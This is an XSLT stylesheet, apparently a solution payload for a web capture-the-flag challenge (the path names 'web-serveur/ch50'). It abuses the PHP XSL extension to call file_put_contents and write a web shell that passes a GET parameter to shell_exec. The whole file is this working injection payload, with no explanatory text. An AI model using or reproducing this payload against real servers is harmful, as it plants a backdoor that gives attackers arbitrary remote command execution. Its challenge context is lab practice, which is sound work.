<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">


    <xsl:value-of select="php:function('file_put_contents','/challenge/web-serveur/ch50/shell.php','<?php echo shell_exec($_GET["e"]); ?>')"/>
    
    </xsl:template>
</xsl:stylesheet>
